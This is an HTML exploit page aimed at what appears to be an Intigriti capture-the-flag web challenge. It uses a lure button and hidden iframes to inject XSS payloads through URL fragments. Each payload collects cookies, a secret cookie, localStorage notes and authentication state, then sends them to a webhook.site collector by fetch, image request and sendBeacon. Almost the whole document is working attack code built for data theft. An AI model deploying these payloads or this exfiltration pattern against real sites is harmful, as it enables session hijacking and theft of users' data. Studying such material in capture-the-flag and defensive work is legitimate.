<!DOCTYPE html>
<html>
<head>
    <title>Click Me</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
        }
        .button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px 40px;
            background-color: #4CAF50;
            color: white;
            font-size: 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <button id="clickme" class="button">Click Me!</button>

    <script>
        // When page loads
        window.onload = function() {
            // Create perfect center button for bot to click
            const centerButton = document.createElement('button');
            centerButton.textContent = 'Click Me!';
            centerButton.className = 'button';
            
            // When clicked, redirect to challenge site with malicious URL fragment
            centerButton.addEventListener('click', function() {
                // Create an iframe that points to the challenge site
                const iframe = document.createElement('iframe');
                
                // Set up the iframe
                iframe.style.position = 'fixed';
                iframe.style.top = '0';
                iframe.style.left = '0';
                iframe.style.width = '100%';
                iframe.style.height = '100%';
                iframe.style.border = 'none';
                iframe.style.zIndex = '9999';
                
                // Add exploit code in URL fragment that will execute when loaded
                // This will extract data from the challenge site
                iframe.src = "https://challenge-0325.intigriti.io/#" + encodeURIComponent(`
                <img src=x onerror="
                    (function() {
                        // Get all cookies
                        const cookies = document.cookie;
                        
                        // Get localStorage data
                        const localStorageData = {};
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i);
                            localStorageData[key] = localStorage.getItem(key);
                        }
                        
                        // Try to get the secret cookie and decode it
                        let secretCookie = '';
                        let decodedSecret = '';
                        try {
                            const cookieParts = cookies.split('; ');
                            for (let i = 0; i < cookieParts.length; i++) {
                                if (cookieParts[i].startsWith('secret=')) {
                                    secretCookie = cookieParts[i].substring(7);
                                    break;
                                }
                            }
                            
                            if (secretCookie) {
                                decodedSecret = atob(secretCookie);
                            }
                        } catch (e) {}
                        
                        // Prepare data to send
                        const data = {
                            cookies: cookies,
                            localStorage: localStorageData,
                            secretCookie: secretCookie,
                            decodedSecret: decodedSecret,
                            url: window.location.href,
                            timestamp: new Date().toISOString()
                        };
                        
                        // Try to extract flag from decoded secret
                        if (decodedSecret && decodedSecret.includes(':')) {
                            data.flag = decodedSecret.split(':')[1];
                        }
                        
                        // Send data via fetch
                        try {
                            fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(data),
                                mode: 'no-cors'
                            });
                        } catch (e) {}
                        
                        // Send via image as backup
                        try {
                            const img = new Image();
                            img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + 
                                encodeURIComponent(data.flag || '') + 
                                '&secret=' + encodeURIComponent(secretCookie) +
                                '&notes=' + encodeURIComponent(JSON.stringify(localStorageData)) +
                                '&t=' + Date.now();
                            document.body.appendChild(img);
                        } catch (e) {}
                        
                        // Try beacon
                        try {
                            navigator.sendBeacon(
                                'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',
                                JSON.stringify(data)
                            );
                        } catch (e) {}
                    })();
                ">
                `);
                
                // Add iframe to page
                document.body.innerHTML = '';
                document.body.appendChild(iframe);
                
                // Schedule a second attempt using a different approach
                setTimeout(function() {
                    // Create a link that navigates to the challenge site with script in fragment
                    const link = document.createElement('a');
                    link.href = "https://challenge-0325.intigriti.io/notes#" + encodeURIComponent(`
                    <img src=x onerror="
                        setTimeout(function() {
                            const img = new Image();
                            img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c=' + 
                                encodeURIComponent(document.cookie) + 
                                '&ls=' + encodeURIComponent(localStorage.getItem('notes')) +
                                '&auth=' + encodeURIComponent(localStorage.getItem('isAuthenticated')) +
                                '&t2=' + Date.now();
                            document.body.appendChild(img);
                        }, 1000);
                    ">
                    `);
                    
                    // Click the link programmatically
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                }, 10000);
            });
            
            // Replace the original button with our center button
            document.body.innerHTML = '';
            document.body.appendChild(centerButton);
            
            // Try an initial redirect approach
            setTimeout(function() {
                // Add a hidden image with an attempt to redirect 
                const img = document.createElement('img');
                img.style.display = 'none';
                img.onerror = function() {
                    // Try to navigate to challenge site with XSS payload
                    const challUrl = "https://challenge-0325.intigriti.io/protected-note#" + encodeURIComponent(`
                    <img src=x onerror="
                        setTimeout(function() {
                            const data = {
                                cookies: document.cookie,
                                localStorage: {
                                    notes: localStorage.getItem('notes'),
                                    isAuthenticated: localStorage.getItem('isAuthenticated')
                                }
                            };
                            
                            // Send via beacon for reliability
                            navigator.sendBeacon(
                                'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',
                                JSON.stringify(data)
                            );
                        }, 500);
                    ">
                    `);
                    
                    // Hidden iframe to the challenge site
                    const hiddenFrame = document.createElement('iframe');
                    hiddenFrame.style.position = 'absolute';
                    hiddenFrame.style.top = '-9999px';
                    hiddenFrame.style.left = '-9999px';
                    hiddenFrame.style.width = '1px';
                    hiddenFrame.style.height = '1px';
                    hiddenFrame.src = challUrl;
                    document.body.appendChild(hiddenFrame);
                };
                img.src = "x"; // Will trigger error
                document.body.appendChild(img);
            }, 1000);
        };
    </script>
</body>
</html>
